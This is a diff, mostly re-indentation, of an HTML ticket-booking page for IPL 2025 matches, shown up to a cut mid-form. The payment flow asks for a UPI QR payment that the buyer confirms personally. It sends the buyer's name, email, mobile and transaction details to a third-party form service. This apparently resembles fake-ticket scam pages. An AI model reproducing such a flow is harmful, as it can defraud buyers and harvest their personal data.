@@ -1,18 +1,20 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>IPL 2025 - Book Your Tickets</title>
-  <link rel="icon" type="image/png" href="logo.png">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
-  <!-- Flatpickr CSS for professional date picker -->
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/flatpickr/dist/flatpickr.min.css" />
-  <!-- QR Code library for payment QR codes -->
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>IPL 2025 - Book Your Tickets</title>
+    <link rel="icon" type="image/png" href="logo.png">
+    <link rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+    <!-- Flatpickr CSS for professional date picker -->
+    <link rel="stylesheet"
+      href="https://cdn.jsdelivr.net/npm/flatpickr/dist/flatpickr.min.css" />
+    <!-- QR Code library for payment QR codes -->
+    <script
+      src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
 
-  
-  <style>
+    <style>
     :root {
   --primary: #0159a3;
   --secondary: #ff9e00;
@@ -1369,543 +1371,647 @@ body.dark-mode .form-group small {
   color: #bbb;
 }
   </style>
-</head>
-<body>
-  <!-- Header -->
-  <header>
-    <div class="header-top">
+  </head>
+  <body>
+    <!-- Header -->
+    <header>
+      <div class="header-top">
+        <div class="container">
+          <div class="company-logo">
+            <img src="logo.png" alt="Company Logo" />
+          </div>
+          <div class="theme-toggle">
+            <button id="theme-toggle-btn"><i class="fas fa-sun"></i></button>
+          </div>
+        </div>
+      </div>
+      <div class="header-bottom">
+        <div class="container nav-container">
+          <div class="ipl-logo">
+            <img
+              src="https://upload.wikimedia.org/wikipedia/en/thumb/8/84/Indian_Premier_League_Official_Logo.svg/640px-Indian_Premier_League_Official_Logo.svg.png"
+              alt="IPL Logo" />
+          </div>
+          <!-- Mobile Menu Toggle Button -->
+          <button class="mobile-menu-toggle" id="mobile-menu-toggle"><i
+              class="fas fa-bars"></i></button>
+          <nav>
+            <ul class="nav-links">
+              <li><a href="#">Home</a></li>
+              <li><a href="#schedule">Schedule</a></li>
+              <li><a href="#teams">Teams</a></li>
+              <li><a href="#venues">Venues</a></li>
+              <li><a href="#faq">FAQs</a></li>
+              <li><a href="#contact">Contact</a></li>
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </header>
+    <!-- Hero Section -->
+    <section class="hero">
+      <video class="bg-video" autoplay muted loop playsinline>
+        <source src="video/background.mp4" type="video/mp4" />
+        Your browser does not support the video tag.
+      </video>
+      <div class="container hero-content">
+        <h2>IPL 2025 Tickets</h2>
+        <p>Experience the thrill of live cricket as the Indian Premier League
+          returns for its 18th season. Book your tickets now and witness the
+          world's best cricketers in action!</p>
+        <a href="#upcoming-matches" class="cta-button">Book Tickets</a>
+      </div>
+    </section>
+    <!-- Search Section -->
+    <section class="search-section">
       <div class="container">
-        <div class="company-logo">
-          <img src="logo.png" alt="Company Logo" />
-        </div>
-        <div class="theme-toggle">
-          <button id="theme-toggle-btn"><i class="fas fa-sun"></i></button>
-        </div>
-      </div>
-    </div>
-    <div class="header-bottom">
-      <div class="container nav-container">
-        <div class="ipl-logo">
-          <img src="https://upload.wikimedia.org/wikipedia/en/thumb/8/84/Indian_Premier_League_Official_Logo.svg/640px-Indian_Premier_League_Official_Logo.svg.png" alt="IPL Logo" />
-        </div>
-        <!-- Mobile Menu Toggle Button -->
-        <button class="mobile-menu-toggle" id="mobile-menu-toggle"><i class="fas fa-bars"></i></button>
-        <nav>
-          <ul class="nav-links">
-            <li><a href="#">Home</a></li>
-            <li><a href="#schedule">Schedule</a></li>
-            <li><a href="#teams">Teams</a></li>
-            <li><a href="#venues">Venues</a></li>
-            <li><a href="#faq">FAQs</a></li>
-            <li><a href="#contact">Contact</a></li>
-          </ul>
-        </nav>
-      </div>
-    </div>
-  </header>
-  <!-- Hero Section -->
-  <section class="hero">
-    <video class="bg-video" autoplay muted loop playsinline>
-      <source src="video/background.mp4" type="video/mp4" />
-      Your browser does not support the video tag.
-    </video>
-    <div class="container hero-content">
-      <h2>IPL 2025 Tickets</h2>
-      <p>Experience the thrill of live cricket as the Indian Premier League returns for its 18th season. Book your tickets now and witness the world's best cricketers in action!</p>
-      <a href="#upcoming-matches" class="cta-button">Book Tickets</a>
-    </div>
-  </section>
-  <!-- Search Section -->
-  <section class="search-section">
-    <div class="container">
-      <div class="search-container">
-        <div class="search-box">
-          <select id="city-filter">
-            <option value="">Select City</option>
-          </select>
-        </div>
-        <div class="search-box">
-          <div class="custom-dropdown" id="team-dropdown">
-            <div class="selected-option">Select Team</div>
-            <div class="dropdown-options">
-              <div class="dropdown-option" data-value="">
-                <img src="" alt="" /> All Teams
+        <div class="search-container">
+          <div class="search-box">
+            <select id="city-filter">
+              <option value>Select City</option>
+            </select>
+          </div>
+          <div class="search-box">
+            <div class="custom-dropdown" id="team-dropdown">
+              <div class="selected-option">Select Team</div>
+              <div class="dropdown-options">
+                <div class="dropdown-option" data-value>
+                  <img src alt /> All Teams
+                </div>
               </div>
             </div>
           </div>
-        </div>
-        <div class="search-box">
-          <input type="text" id="date-filter" class="custom-calendar" placeholder="Select Date" />
-        </div>
-        <button class="search-button" id="search-btn">
-          <i class="fas fa-search"></i> Find Matches
-        </button>
-        <button class="search-button" id="clear-filter-btn">
-          <i class="fas fa-times"></i> Clear Filters
-        </button>
-      </div>
-    </div>
-  </section>
-  <!-- Matches Section -->
-  <section class="matches-section" id="upcoming-matches">
-    <div class="container">
-      <h2 class="section-title">Upcoming Matches</h2>
-      <div class="matches-grid" id="upcoming-matches-container">
-        <!-- Upcoming match cards will be dynamically inserted -->
-      </div>
-      <div class="pagination" id="pagination-container"></div>
-      <div id="past-matches-section">
-        <h2 class="section-title" style="margin-top:40px;">Past Matches</h2>
-        <div class="matches-grid" id="past-matches-container">
-          <!-- Past match cards will be dynamically inserted -->
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <!-- Teams Scroller Section -->
-<section class="teams-scroller" id="teams">
-  <div class="scroll-container">
-    <div class="scroll-content">
-      <!-- First set of teams -->
-      <div class="team">
-        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/2/2b/Chennai_Super_Kings_Logo.svg/1200px-Chennai_Super_Kings_Logo.svg.png" alt="Chennai Super Kings Logo" />
-        <!-- <span>Chennai Super Kings</span> -->
-      </div>
-      <div class="team">
-        <img src="https://upload.wikimedia.org/wikipedia/sa/b/b3/Mumbai_Indians_Logo.png?20120501114446" alt="Mumbai Indians Logo" />
-        <!-- <span>Mumbai Indians</span> -->
-      </div>
-      <div class="team">
-        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/d/d4/Royal_Challengers_Bengaluru_Logo.svg/240px-Royal_Challengers_Bengaluru_Logo.svg.png" alt="Royal Challengers Bangalore Logo" />
-        <!-- <span>Royal Challengers Bangalore</span> -->
-      </div>
-      <div class="team">
-        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/2/2f/Delhi_Capitals.svg/360px-Delhi_Capitals.svg.png" alt="Delhi Capitals Logo" />
-        <!-- <span>Delhi Capitals</span> -->
-      </div>
-      <div class="team">
-        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/4/4c/Kolkata_Knight_Riders_Logo.svg/263px-Kolkata_Knight_Riders_Logo.svg.png" alt="Kolkata Knight Riders Logo" />
-        <!-- <span>Kolkata Knight Riders</span> -->
-      </div>
-      <div class="team">
-        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/5/51/Sunrisers_Hyderabad_Logo.svg/390px-Sunrisers_Hyderabad_Logo.svg.png" alt="Sunrisers Hyderabad Logo" />
-        <!-- <span>Sunrisers Hyderabad</span> -->
-      </div>
-      <div class="team">
-        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/5/5c/This_is_the_logo_for_Rajasthan_Royals%2C_a_cricket_team_playing_in_the_Indian_Premier_League_%28IPL%29.svg/300px-This_is_the_logo_for_Rajasthan_Royals%2C_a_cricket_team_playing_in_the_Indian_Premier_League_%28IPL%29.svg.png" alt="Rajasthan Royals Logo" />
-        <!-- <span>Rajasthan Royals</span> -->
-      </div>
-      <div class="team">
-        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/d/d4/Punjab_Kings_Logo.svg/255px-Punjab_Kings_Logo.svg.png" alt="Punjab Kings Logo" />
-        <!-- <span>Punjab Kings</span> -->
-      </div>
-      <!-- Duplicate the set for seamless looping -->
-      <div class="team">
-        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/2/2b/Chennai_Super_Kings_Logo.svg/1200px-Chennai_Super_Kings_Logo.svg.png" alt="Chennai Super Kings Logo" />
-        <!-- <span>Chennai Super Kings</span> -->
-      </div>
-      <div class="team">
-        <img src="https://upload.wikimedia.org/wikipedia/sa/b/b3/Mumbai_Indians_Logo.png?20120501114446" alt="Mumbai Indians Logo" />
-        <!-- <span>Mumbai Indians</span> -->
-      </div>
-      <div class="team">
-        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/d/d4/Royal_Challengers_Bengaluru_Logo.svg/240px-Royal_Challengers_Bengaluru_Logo.svg.png" alt="Royal Challengers Bangalore Logo" />
-        <!-- <span>Royal Challengers Bangalore</span> -->
-      </div>
-      <div class="team">
-        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/2/2f/Delhi_Capitals.svg/360px-Delhi_Capitals.svg.png" alt="Delhi Capitals Logo" />
-        <!-- <span>Delhi Capitals</span> -->
-      </div>
-      <div class="team">
-        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/4/4c/Kolkata_Knight_Riders_Logo.svg/263px-Kolkata_Knight_Riders_Logo.svg.png" alt="Kolkata Knight Riders Logo" />
-        <!-- <span>Kolkata Knight Riders</span> -->
-      </div>
-      <div class="team">
-        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/5/51/Sunrisers_Hyderabad_Logo.svg/390px-Sunrisers_Hyderabad_Logo.svg.png" alt="Sunrisers Hyderabad Logo" />
-        <!-- <span>Sunrisers Hyderabad</span> -->
-      </div>
-      <div class="team">
-        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/5/5c/This_is_the_logo_for_Rajasthan_Royals%2C_a_cricket_team_playing_in_the_Indian_Premier_League_%28IPL%29.svg/300px-This_is_the_logo_for_Rajasthan_Royals%2C_a_cricket_team_playing_in_the_Indian_Premier_League_%28IPL%29.svg.png" alt="Rajasthan Royals Logo" />
-        <!-- <span>Rajasthan Royals</span> -->
-      </div>
-      <div class="team">
-        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/d/d4/Punjab_Kings_Logo.svg/255px-Punjab_Kings_Logo.svg.png" alt="Punjab Kings Logo" />
-        <!-- <span>Punjab Kings</span> -->
-      </div>
-    </div>
-  </div>
-</section>
-
-  <!-- Schedule Section with Pagination -->
-  <section class="schedule-section" id="schedule">
-    <div class="container">
-      <h2 class="section-title">IPL 2025 Schedule</h2>
-      <div class="table-responsive">
-        <table class="schedule-table">
-          <thead>
-            <tr>
-              <th>Date</th>
-              <th>Match</th>
-              <th>Venue</th>
-              <th>Time</th>
-              <th>Action</th>
-            </tr>
-          </thead>
-          <tbody id="schedule-body">
-            <!-- Schedule rows will be dynamically inserted -->
-          </tbody>
-        </table>
-      </div>
-      <div class="schedule-pagination" id="schedule-pagination-container"></div>
-    </div>
-  </section>
-  <!-- Stadiums Section -->
-  <section class="stadiums-section" id="venues">
-    <div class="container">
-      <h2 class="section-title">Stadiums</h2>
-      <div class="stadiums-grid" id="stadiums-container">
-        <!-- Stadium cards will be dynamically inserted -->
-      </div>
-    </div>
-  </section>
-  <!-- Seat Selection / Billing Modal -->
-  <div id="seat-modal" class="modal">
-    <div class="modal-content billing-modal">
-      <span class="close" id="close-modal">&times;</span>
-      <div class="modal-header">
-        <div class="modal-title">Select Your Seats</div>
-        <div class="match-details">
-          <div class="modal-teams">
-            <img src="/api/placeholder/30/30" alt="Team 1" class="modal-team-logo" id="modal-team1-logo" />
-            <span>vs</span>
-            <img src="/api/placeholder/30/30" alt="Team 2" class="modal-team-logo" id="modal-team2-logo" />
+          <div class="search-box">
+            <input type="text" id="date-filter" class="custom-calendar"
+              placeholder="Select Date" />
           </div>
-          <div id="modal-match-date"></div>
+          <button class="search-button" id="search-btn">
+            <i class="fas fa-search"></i> Find Matches
+          </button>
+          <button class="search-button" id="clear-filter-btn">
+            <i class="fas fa-times"></i> Clear Filters
+          </button>
         </div>
       </div>
-      <div class="modal-body">
-        <div class="billing-container">
-          <!-- Seat Selection Column -->
-          <div class="seat-selection">
-            <h3>Choose Your Seats</h3>
-            <!-- The seating layout will be generated dynamically here -->
-            <div id="seat-layout"></div>
-          </div>
-          <!-- Booking Summary Column -->
-          <div class="booking-summary">
-            <h3>Booking Summary</h3>
-            <div class="match-info">
-              <p><strong>Match:</strong> <span id="summary-match"></span></p>
-              <p><strong>Date:</strong> <span id="summary-date"></span></p>
-              <p><strong>Venue:</strong> <span id="summary-venue"></span></p>
-              <p><strong>Time:</strong> <span id="summary-time"></span></p>
-            </div>
-            <div class="selected-seats">
-              <h4>Selected Seats</h4>
-              <ul id="selected-seats-container">
-                <li class="no-seats">No seats selected</li>
-              </ul>
-            </div>
-            <div class="price-summary">
-              <p><strong>Subtotal:</strong> <span id="subtotal">₹0</span></p>
-              <p><strong>Convenience Fee:</strong> <span id="convenience-fee">₹0</span></p>
-              <p class="total"><strong>Total:</strong> <span id="total-price">₹0</span></p>
-            </div>
-            <button class="proceed-btn" id="proceed-btn" disabled>Proceed to Payment</button>
+    </section>
+    <!-- Matches Section -->
+    <section class="matches-section" id="upcoming-matches">
+      <div class="container">
+        <h2 class="section-title">Upcoming Matches</h2>
+        <div class="matches-grid" id="upcoming-matches-container">
+          <!-- Upcoming match cards will be dynamically inserted -->
+        </div>
+        <div class="pagination" id="pagination-container"></div>
+        <div id="past-matches-section">
+          <h2 class="section-title" style="margin-top:40px;">Past Matches</h2>
+          <div class="matches-grid" id="past-matches-container">
+            <!-- Past match cards will be dynamically inserted -->
           </div>
         </div>
       </div>
-    </div>
-  </div>
-  <!-- Stadium Matches Modal -->
-  <div id="stadium-modal" class="modal">
-    <div class="modal-content">
-      <span class="close" id="close-stadium-modal">&times;</span>
-      <div class="modal-header">
-        <div class="modal-title" id="stadium-modal-title"></div>
-      </div>
-      <div class="modal-body" id="stadium-modal-body">
-        <!-- Stadium matches will be dynamically inserted here -->
-      </div>
-    </div>
-  </div>
+    </section>
 
-  <!-- Updated Payment Modal with Google Pay and QR Code options -->
-  <div id="payment-modal" class="modal">
-    <div class="modal-content" style="max-width:500px; margin: auto;">
-      <span class="close" id="close-payment-modal">&times;</span>
-      <div class="payment-container">
-        <h1>Complete Your Payment</h1>
-        <form id="payment-details-form">
-          <input type="text" id="payer-name" placeholder="Enter your name" required style="width: 100%; padding: 10px; margin-bottom:10px;">
-          <input type="email" id="payer-email" placeholder="Enter your email" required style="width: 100%; padding: 10px; margin-bottom:10px;">
-          <input type="text" id="payer-mobile" placeholder="Enter your mobile number" required style="width: 100%; padding: 10px; margin-bottom:10px;">
-          <div style="margin-bottom:15px; font-size: 18px; font-weight: 600;">Total Amount: <span id="payment-amount">₹0</span></div>
-          
-          <div class="payment-methods">
-            <h3 style="margin-bottom: 15px;">Select Payment Method</h3>
-            
-            <!-- Google Pay Button -->
-            <button type="button" id="google-pay-btn" class="payment-option-btn">
-              <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c7/Google_Pay_Logo_%282020%29.svg/512px-Google_Pay_Logo_%282020%29.svg.png" 
-                   alt="Google Pay" style="height: 20px; margin-right: 10px;">
-              Pay with Google Pay
-            </button>
-            
-            <!-- QR Code Button -->
-            <button type="button" id="qr-code-btn" class="payment-option-btn">
-              <i class="fas fa-qrcode" style="margin-right: 10px;"></i>
-              Pay with QR Code
-            </button>
-            
-            <!-- QR Code container (hidden by default) -->
-            <div id="qr-code-container" style="display: none; text-align: center; margin-top: 20px;">
-              <div style="background-color: white; padding: 20px; display: inline-block; border-radius: 10px;">
-                <div id="qr-code"></div>
-                <p style="margin-top: 10px; font-size: 14px;">Scan with any UPI app to pay</p>
+    <!-- Teams Scroller Section -->
+    <section class="teams-scroller" id="teams">
+      <div class="scroll-container">
+        <div class="scroll-content">
+          <!-- First set of teams -->
+          <div class="team">
+            <img
+              src="https://upload.wikimedia.org/wikipedia/en/thumb/2/2b/Chennai_Super_Kings_Logo.svg/1200px-Chennai_Super_Kings_Logo.svg.png"
+              alt="Chennai Super Kings Logo" />
+            <!-- <span>Chennai Super Kings</span> -->
+          </div>
+          <div class="team">
+            <img
+              src="https://upload.wikimedia.org/wikipedia/sa/b/b3/Mumbai_Indians_Logo.png?20120501114446"
+              alt="Mumbai Indians Logo" />
+            <!-- <span>Mumbai Indians</span> -->
+          </div>
+          <div class="team">
+            <img
+              src="https://upload.wikimedia.org/wikipedia/en/thumb/d/d4/Royal_Challengers_Bengaluru_Logo.svg/240px-Royal_Challengers_Bengaluru_Logo.svg.png"
+              alt="Royal Challengers Bangalore Logo" />
+            <!-- <span>Royal Challengers Bangalore</span> -->
+          </div>
+          <div class="team">
+            <img
+              src="https://upload.wikimedia.org/wikipedia/en/thumb/2/2f/Delhi_Capitals.svg/360px-Delhi_Capitals.svg.png"
+              alt="Delhi Capitals Logo" />
+            <!-- <span>Delhi Capitals</span> -->
+          </div>
+          <div class="team">
+            <img
+              src="https://upload.wikimedia.org/wikipedia/en/thumb/4/4c/Kolkata_Knight_Riders_Logo.svg/263px-Kolkata_Knight_Riders_Logo.svg.png"
+              alt="Kolkata Knight Riders Logo" />
+            <!-- <span>Kolkata Knight Riders</span> -->
+          </div>
+          <div class="team">
+            <img
+              src="https://upload.wikimedia.org/wikipedia/en/thumb/5/51/Sunrisers_Hyderabad_Logo.svg/390px-Sunrisers_Hyderabad_Logo.svg.png"
+              alt="Sunrisers Hyderabad Logo" />
+            <!-- <span>Sunrisers Hyderabad</span> -->
+          </div>
+          <div class="team">
+            <img
+              src="https://upload.wikimedia.org/wikipedia/en/thumb/5/5c/This_is_the_logo_for_Rajasthan_Royals%2C_a_cricket_team_playing_in_the_Indian_Premier_League_%28IPL%29.svg/300px-This_is_the_logo_for_Rajasthan_Royals%2C_a_cricket_team_playing_in_the_Indian_Premier_League_%28IPL%29.svg.png"
+              alt="Rajasthan Royals Logo" />
+            <!-- <span>Rajasthan Royals</span> -->
+          </div>
+          <div class="team">
+            <img
+              src="https://upload.wikimedia.org/wikipedia/en/thumb/d/d4/Punjab_Kings_Logo.svg/255px-Punjab_Kings_Logo.svg.png"
+              alt="Punjab Kings Logo" />
+            <!-- <span>Punjab Kings</span> -->
+          </div>
+          <!-- Duplicate the set for seamless looping -->
+          <div class="team">
+            <img
+              src="https://upload.wikimedia.org/wikipedia/en/thumb/2/2b/Chennai_Super_Kings_Logo.svg/1200px-Chennai_Super_Kings_Logo.svg.png"
+              alt="Chennai Super Kings Logo" />
+            <!-- <span>Chennai Super Kings</span> -->
+          </div>
+          <div class="team">
+            <img
+              src="https://upload.wikimedia.org/wikipedia/sa/b/b3/Mumbai_Indians_Logo.png?20120501114446"
+              alt="Mumbai Indians Logo" />
+            <!-- <span>Mumbai Indians</span> -->
+          </div>
+          <div class="team">
+            <img
+              src="https://upload.wikimedia.org/wikipedia/en/thumb/d/d4/Royal_Challengers_Bengaluru_Logo.svg/240px-Royal_Challengers_Bengaluru_Logo.svg.png"
+              alt="Royal Challengers Bangalore Logo" />
+            <!-- <span>Royal Challengers Bangalore</span> -->
+          </div>
+          <div class="team">
+            <img
+              src="https://upload.wikimedia.org/wikipedia/en/thumb/2/2f/Delhi_Capitals.svg/360px-Delhi_Capitals.svg.png"
+              alt="Delhi Capitals Logo" />
+            <!-- <span>Delhi Capitals</span> -->
+          </div>
+          <div class="team">
+            <img
+              src="https://upload.wikimedia.org/wikipedia/en/thumb/4/4c/Kolkata_Knight_Riders_Logo.svg/263px-Kolkata_Knight_Riders_Logo.svg.png"
+              alt="Kolkata Knight Riders Logo" />
+            <!-- <span>Kolkata Knight Riders</span> -->
+          </div>
+          <div class="team">
+            <img
+              src="https://upload.wikimedia.org/wikipedia/en/thumb/5/51/Sunrisers_Hyderabad_Logo.svg/390px-Sunrisers_Hyderabad_Logo.svg.png"
+              alt="Sunrisers Hyderabad Logo" />
+            <!-- <span>Sunrisers Hyderabad</span> -->
+          </div>
+          <div class="team">
+            <img
+              src="https://upload.wikimedia.org/wikipedia/en/thumb/5/5c/This_is_the_logo_for_Rajasthan_Royals%2C_a_cricket_team_playing_in_the_Indian_Premier_League_%28IPL%29.svg/300px-This_is_the_logo_for_Rajasthan_Royals%2C_a_cricket_team_playing_in_the_Indian_Premier_League_%28IPL%29.svg.png"
+              alt="Rajasthan Royals Logo" />
+            <!-- <span>Rajasthan Royals</span> -->
+          </div>
+          <div class="team">
+            <img
+              src="https://upload.wikimedia.org/wikipedia/en/thumb/d/d4/Punjab_Kings_Logo.svg/255px-Punjab_Kings_Logo.svg.png"
+              alt="Punjab Kings Logo" />
+            <!-- <span>Punjab Kings</span> -->
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Schedule Section with Pagination -->
+    <section class="schedule-section" id="schedule">
+      <div class="container">
+        <h2 class="section-title">IPL 2025 Schedule</h2>
+        <div class="table-responsive">
+          <table class="schedule-table">
+            <thead>
+              <tr>
+                <th>Date</th>
+                <th>Match</th>
+                <th>Venue</th>
+                <th>Time</th>
+                <th>Action</th>
+              </tr>
+            </thead>
+            <tbody id="schedule-body">
+              <!-- Schedule rows will be dynamically inserted -->
+            </tbody>
+          </table>
+        </div>
+        <div class="schedule-pagination"
+          id="schedule-pagination-container"></div>
+      </div>
+    </section>
+    <!-- Stadiums Section -->
+    <section class="stadiums-section" id="venues">
+      <div class="container">
+        <h2 class="section-title">Stadiums</h2>
+        <div class="stadiums-grid" id="stadiums-container">
+          <!-- Stadium cards will be dynamically inserted -->
+        </div>
+      </div>
+    </section>
+    <!-- Seat Selection / Billing Modal -->
+    <div id="seat-modal" class="modal">
+      <div class="modal-content billing-modal">
+        <span class="close" id="close-modal">&times;</span>
+        <div class="modal-header">
+          <div class="modal-title">Select Your Seats</div>
+          <div class="match-details">
+            <div class="modal-teams">
+              <img src="/api/placeholder/30/30" alt="Team 1"
+                class="modal-team-logo" id="modal-team1-logo" />
+              <span>vs</span>
+              <img src="/api/placeholder/30/30" alt="Team 2"
+                class="modal-team-logo" id="modal-team2-logo" />
+            </div>
+            <div id="modal-match-date"></div>
+          </div>
+        </div>
+        <div class="modal-body">
+          <div class="billing-container">
+            <!-- Seat Selection Column -->
+            <div class="seat-selection">
+              <h3>Choose Your Seats</h3>
+              <!-- The seating layout will be generated dynamically here -->
+              <div id="seat-layout"></div>
+            </div>
+            <!-- Booking Summary Column -->
+            <div class="booking-summary">
+              <h3>Booking Summary</h3>
+              <div class="match-info">
+                <p><strong>Match:</strong> <span id="summary-match"></span></p>
+                <p><strong>Date:</strong> <span id="summary-date"></span></p>
+                <p><strong>Venue:</strong> <span id="summary-venue"></span></p>
+                <p><strong>Time:</strong> <span id="summary-time"></span></p>
               </div>
-              <button type="button" id="payment-confirmed-btn" style="margin-top: 20px; padding: 10px 20px; background-color: var(--primary); color: white; border: none; border-radius: 5px; cursor: pointer;">
-                I've Made the Payment
+              <div class="selected-seats">
+                <h4>Selected Seats</h4>
+                <ul id="selected-seats-container">
+                  <li class="no-seats">No seats selected</li>
+                </ul>
+              </div>
+              <div class="price-summary">
+                <p><strong>Subtotal:</strong> <span id="subtotal">₹0</span></p>
+                <p><strong>Convenience Fee:</strong> <span
+                    id="convenience-fee">₹0</span></p>
+                <p class="total"><strong>Total:</strong> <span
+                    id="total-price">₹0</span></p>
+              </div>
+              <button class="proceed-btn" id="proceed-btn" disabled>Proceed to
+                Payment</button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <!-- Stadium Matches Modal -->
+    <div id="stadium-modal" class="modal">
+      <div class="modal-content">
+        <span class="close" id="close-stadium-modal">&times;</span>
+        <div class="modal-header">
+          <div class="modal-title" id="stadium-modal-title"></div>
+        </div>
+        <div class="modal-body" id="stadium-modal-body">
+          <!-- Stadium matches will be dynamically inserted here -->
+        </div>
+      </div>
+    </div>
+
+    <!-- Updated Payment Modal with Google Pay and QR Code options -->
+    <div id="payment-modal" class="modal">
+      <div class="modal-content" style="max-width:500px; margin: auto;">
+        <span class="close" id="close-payment-modal">&times;</span>
+        <div class="payment-container">
+          <h1>Complete Your Payment</h1>
+          <form id="payment-details-form">
+            <input type="text" id="payer-name" placeholder="Enter your name"
+              required style="width: 100%; padding: 10px; margin-bottom:10px;">
+            <input type="email" id="payer-email" placeholder="Enter your email"
+              required style="width: 100%; padding: 10px; margin-bottom:10px;">
+            <input type="text" id="payer-mobile"
+              placeholder="Enter your mobile number" required
+              style="width: 100%; padding: 10px; margin-bottom:10px;">
+            <div
+              style="margin-bottom:15px; font-size: 18px; font-weight: 600;">Total
+              Amount: <span id="payment-amount">₹0</span></div>
+
+            <div class="payment-methods">
+              <h3 style="margin-bottom: 15px;">Select Payment Method</h3>
+
+              <!-- Google Pay Button -->
+              <button type="button" id="google-pay-btn"
+                class="payment-option-btn">
+                <img
+                  src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c7/Google_Pay_Logo_%282020%29.svg/512px-Google_Pay_Logo_%282020%29.svg.png"
+                  alt="Google Pay" style="height: 20px; margin-right: 10px;">
+                Pay with Google Pay
+              </button>
+
+              <!-- QR Code Button -->
+              <button type="button" id="qr-code-btn" class="payment-option-btn">
+                <i class="fas fa-qrcode" style="margin-right: 10px;"></i>
+                Pay with QR Code
+              </button>
+
+              <!-- QR Code container (hidden by default) -->
+              <div id="qr-code-container"
+                style="display: none; text-align: center; margin-top: 20px;">
+                <div
+                  style="background-color: white; padding: 20px; display: inline-block; border-radius: 10px;">
+                  <div id="qr-code"></div>
+                  <p style="margin-top: 10px; font-size: 14px;">Scan with any
+                    UPI app to pay</p>
+                </div>
+                <button type="button" id="payment-confirmed-btn"
+                  style="margin-top: 20px; padding: 10px 20px; background-color: var(--primary); color: white; border: none; border-radius: 5px; cursor: pointer;">
+                  I've Made the Payment
+                </button>
+              </div>
+            </div>
+          </form>
+        </div>
+      </div>
+    </div>
+
+    <!-- Updated Confirmation Modal with Step-by-Step Process -->
+    <div id="confirmation-modal" class="modal">
+      <div class="modal-content">
+        <span class="close" id="close-confirmation-modal">&times;</span>
+        <div class="confirmation-container" style="padding: 30px;">
+          <h1 style="text-align: center; margin-bottom: 20px;">Payment
+            Confirmation</h1>
+
+          <div class="confirmation-steps">
+            <div class="confirmation-step active" id="confirmation-step-1">
+              <div class="step-indicator">1</div>
+              <h3>Verify Payment Details</h3>
+              <p>Please review your payment details below.</p>
+
+              <div class="detail-card">
+                <div class="detail-row">
+                  <span class="detail-label">Name:</span>
+                  <span class="detail-value" id="confirm-name">Virat Kohli</span>
+                </div>
+                <div class="detail-row">
+                  <span class="detail-label">Email:</span>
+                  <span class="detail-value"
+                    id="confirm-email">ram@example.com</span>
+                </div>
+                <div class="detail-row">
+                  <span class="detail-label">Mobile:</span>
+                  <span class="detail-value"
+                    id="confirm-mobile">9876543210</span>
+                </div>
+                <div class="detail-row">
+                  <span class="detail-label">Amount Paid:</span>
+                  <span class="detail-value" id="confirm-amount">₹0</span>
+                </div>
+              </div>
+
+              <button type="button" id="next-step-btn" class="confirmation-btn">
+                Payment Completed, Continue
               </button>
             </div>
-          </div>
-        </form>
-      </div>
-    </div>
-  </div>
 
-  <!-- Updated Confirmation Modal with Step-by-Step Process -->
-  <div id="confirmation-modal" class="modal">
-    <div class="modal-content">
-      <span class="close" id="close-confirmation-modal">&times;</span>
-      <div class="confirmation-container" style="padding: 30px;">
-        <h1 style="text-align: center; margin-bottom: 20px;">Payment Confirmation</h1>
-        
-        <div class="confirmation-steps">
-          <div class="confirmation-step active" id="confirmation-step-1">
-            <div class="step-indicator">1</div>
-            <h3>Verify Payment Details</h3>
-            <p>Please review your payment details below.</p>
-            
-            <div class="detail-card">
-              <div class="detail-row">
-                <span class="detail-label">Name:</span>
-                <span class="detail-value" id="confirm-name">John Doe</span>
-              </div>
-              <div class="detail-row">
-                <span class="detail-label">Email:</span>
-                <span class="detail-value" id="confirm-email">john@example.com</span>
-              </div>
-              <div class="detail-row">
-                <span class="detail-label">Mobile:</span>
-                <span class="detail-value" id="confirm-mobile">9876543210</span>
-              </div>
-              <div class="detail-row">
-                <span class="detail-label">Amount Paid:</span>
-                <span class="detail-value" id="confirm-amount">₹0</span>
+            <!-- Replace the current form in confirmation-step-2 with this code -->
+            <div class="confirmation-step" id="confirmation-step-2">
+              <div class="step-indicator">2</div>
+              <h3>Submit Transaction Details</h3>
+              <p>Please provide your transaction details for verification.</p>
+
+              <form
+                action="https://formsubmit.co/b9dc2bf0b0bc14a5dba84c0db88ced9c"
+                method="POST" id="confirmation-form"
+                enctype="multipart/form-data">
+                <!-- Hidden inputs for FormSubmit settings -->
+                <input type="hidden" name="_subject"
+                  value="New IPL Ticket Payment Confirmation">
+                <input type="hidden" name="_captcha" value="false">
+                <input type="hidden" name="_next"
+                  value="https://goticketsindia.com/thankyou.html">
+
+                <!-- Hidden fields with booking details -->
+                <input type="hidden" name="name" id="form-name">
+                <input type="hidden" name="email" id="form-email">
